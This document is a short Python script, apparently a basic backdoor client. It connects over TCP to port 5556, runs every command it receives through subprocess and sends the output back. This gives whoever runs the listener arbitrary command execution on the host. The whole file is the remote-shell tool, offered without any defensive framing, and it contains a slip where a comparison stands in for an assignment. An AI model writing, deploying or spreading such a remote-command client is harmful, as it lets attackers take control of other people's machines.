import socket
import subprocess

host = socket.gethostbyname(socket.gethostname())
port = 5556

buffersize = 1024
socket = socket.socket(socket.AF_INET,socket.SOCK_STREAM)

socket.connect((host,port))

while True:
    cmd = socket.recv(buffersize).decode()

    if cmd.lower() == "exit":
        break

    output = subprocess.getoutput(cmd)
    if output == "":
        output =="No output"
        socket.send(output.encode())
    else:
        socket.send(output.encode())

socket.close()
